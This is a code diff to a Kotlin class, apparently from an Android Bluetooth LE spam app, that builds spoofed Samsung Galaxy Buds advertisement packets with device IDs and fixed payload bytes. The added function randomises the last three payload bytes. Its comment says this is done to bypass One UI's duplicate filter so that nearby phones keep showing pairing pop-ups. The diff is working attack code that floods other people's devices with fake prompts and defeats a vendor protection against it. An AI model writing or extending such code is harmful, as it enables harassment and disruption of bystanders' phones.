@@ -17,6 +17,7 @@ import de.simon.dankelmann.bluetoothlespam.Helpers.StringHelpers.Companion.toHex
 import de.simon.dankelmann.bluetoothlespam.Models.AdvertiseData
 import de.simon.dankelmann.bluetoothlespam.Models.AdvertisementSet
 import de.simon.dankelmann.bluetoothlespam.Models.ManufacturerSpecificData
+import kotlin.random.Random
 
 class EasySetupBudsAdvertisementSetGenerator:IAdvertisementSetGenerator{
 
@@ -29,10 +30,6 @@ class EasySetupBudsAdvertisementSetGenerator:IAdvertisementSetGenerator{
     private val _manufacturerId = Constants.MANUFACTURER_ID_SAMSUNG
     private val prependedBudsBytes = StringHelpers.decodeHex("42098102141503210109")
     private val appendedBudsBytes = StringHelpers.decodeHex("063C948E00000000C700") // +16FF75
-
-    //42098102941503210188 5317012A 063CE7EB000000001D00
-    //private val prependedBudsBytes = StringHelpers.decodeHex("42098102941503210188")
-    //private val appendedBudsBytes = StringHelpers.decodeHex("063CE7EB000000001D00")
 
     val _genuineBudsIds = mapOf(
         "EE7A0C" to "Fallback Buds",
@@ -56,6 +53,27 @@ class EasySetupBudsAdvertisementSetGenerator:IAdvertisementSetGenerator{
         "AE073A" to "Black & White Buds2",
         "011716" to "Sleek Black Buds2",
     )
+
+    companion object {
+        /**
+         * Randomizza i bytes trailing del payload Samsung per bypassare
+         * il filtro duplicati di One UI che impedisce pop-up ripetuti.
+         */
+        fun prepareAdvertisementSet(advertisementSet: AdvertisementSet): AdvertisementSet {
+            if (advertisementSet.advertiseData.manufacturerData.isNotEmpty()) {
+                val msd = advertisementSet.advertiseData.manufacturerData[0]
+                val payload = msd.manufacturerSpecificData
+                if (payload.size >= 10) {
+                    // Randomizza gli ultimi 3 bytes del payload per variare il pacchetto
+                    payload[payload.size - 1] = Random.nextBytes(1)[0]
+                    payload[payload.size - 2] = Random.nextBytes(1)[0]
+                    payload[payload.size - 3] = Random.nextBytes(1)[0]
+                    msd.manufacturerSpecificData = payload
+                }
+            }
+            return advertisementSet
+        }
+    }
 
     override fun getAdvertisementSets(inputData: Map<String, String>?): List<AdvertisementSet> {
         var advertisementSets:MutableList<AdvertisementSet> = mutableListOf()
@@ -88,13 +106,10 @@ class EasySetupBudsAdvertisementSetGenerator:IAdvertisementSetGenerator{
             val manufacturerSpecificData = ManufacturerSpecificData()
             manufacturerSpecificData.manufacturerId = _manufacturerId
 
-            //var deviceBytes = StringHelpers.decodeHex(it.key)
-            //var payload = byteArrayOf(deviceBytes[0], deviceBytes[1], 0x01, deviceBytes[2])
             var payload = StringHelpers.decodeHex(it.key.substring(0,4) + "01" + it.key.substring(4))
             var fullPayload = prependedBudsBytes.plus(payload).plus(appendedBudsBytes)
 
             manufacturerSpecificData.manufacturerSpecificData = fullPayload
-            //Log.d("EASY SETUP", "Full Payload(${fullPayload.size}): " + fullPayload.toHexString())
 
             advertisementSet.advertiseData.manufacturerData.add(manufacturerSpecificData)
             advertisementSet.advertiseData.includeTxPower = false
@@ -106,7 +121,6 @@ class EasySetupBudsAdvertisementSetGenerator:IAdvertisementSetGenerator{
             scanResponseManufacturerSpecificData.manufacturerId = _manufacturerId
             scanResponseManufacturerSpecificData.manufacturerSpecificData = StringHelpers.decodeHex("0000000000000000000000000000")
             advertisementSet.scanResponse!!.manufacturerData.add(scanResponseManufacturerSpecificData)
-
 
             // General Data
             advertisementSet.title = it.value
